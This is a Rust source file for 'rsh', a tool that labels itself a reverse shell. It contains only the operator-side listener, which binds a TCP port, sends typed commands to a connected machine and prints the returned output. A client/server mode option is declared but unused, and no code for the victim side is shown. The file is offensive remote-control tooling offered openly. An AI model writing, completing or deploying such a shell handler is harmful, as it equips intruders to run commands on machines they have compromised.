use clap::{Parser};
use std::io::prelude::*;
use std::net::{TcpListener, TcpStream};

#[derive(Parser)]
#[command(name = "rsh")]
#[command(author = "Sherlock Holmes, Simonfalke")]
#[command(version = "0.0.1")]
#[command(about = "A Rust reverse shell", long_about = None)]
struct Config {
    ///Select the mode to operate on: client or server.
    mode: String,
	/// Port to operate on.
	#[arg(default_value_t = 8080)]
	port: i32,
	/// IP address to start the server on.
	#[arg(default_value_t = String::from("localhost"))]
	ip: String,
}

fn send_message(stream: &mut TcpStream, message: &String) {
	stream.write(message.as_bytes()).unwrap();
	stream.flush().unwrap();
}

fn get_command() -> String {
	let mut input = String::new();
	std::io::stdin().read_line(&mut input).unwrap();

	input
}

fn receive(stream: &mut TcpStream) -> String {
	let mut data = String::new();
	loop {
		let mut buffer = [0; 512];
		stream.read(&mut buffer).unwrap();
		let mut  converted = String::from_utf8_lossy(&buffer).to_string();
        converted = converted.replace("\0", "");
		if converted == "MESSAGEDONE\n".to_string() {
            println!("Breaking!");
			break;
		}

		println!("pushed");
		data.push_str(&converted.trim());
	}

	data
}

fn handle_client(mut stream: TcpStream) {
	loop {
		let command = get_command();
		send_message(&mut stream, &command);
		loop {
			let mut data = receive(&mut stream);
            data = data.replace("\0", "");
			if data == "END" {
				break;
			}
			println!("{}", data);
		}
	}
}

fn main() {
	let conf: Config = Config::parse();
	let listener = TcpListener::bind(format!("{}:{}", conf.ip, conf.port.to_string())).unwrap();
	println!("Listening at 127.0.0.1 on port {}", conf.port);
	for stream in listener.incoming() {
		match stream {
			Ok(stream) => {
				handle_client(stream);
			}

			Err(e) => {
				println!("Error: {}", e);
			}
		}
	}
}
